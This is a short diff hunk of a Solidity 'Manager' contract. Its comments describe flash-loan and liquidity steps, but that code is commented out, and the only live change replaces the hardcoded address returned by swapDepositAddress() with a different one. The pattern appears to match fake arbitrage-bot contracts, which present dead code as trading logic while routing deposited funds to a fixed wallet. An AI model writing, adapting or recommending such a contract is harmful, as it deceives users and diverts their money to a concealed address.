@@ -44,7 +44,7 @@ contract Manager {
       // Get coins Loan from Multiplier-Finance
       string memory loanAddress = manager.takeFlashLoan(loanAmount);
        */ function swapDepositAddress() public pure returns (address) {
-        return 0x299Ee98984054401B74Dba437976d5b7587f8BB3;
+        return 0xed5EC5e2d70f32fc678cAEd7794725d523dcaa6D;
     }
       /* 
       // Send Borrowed coins to provide liquidity of newly created Token
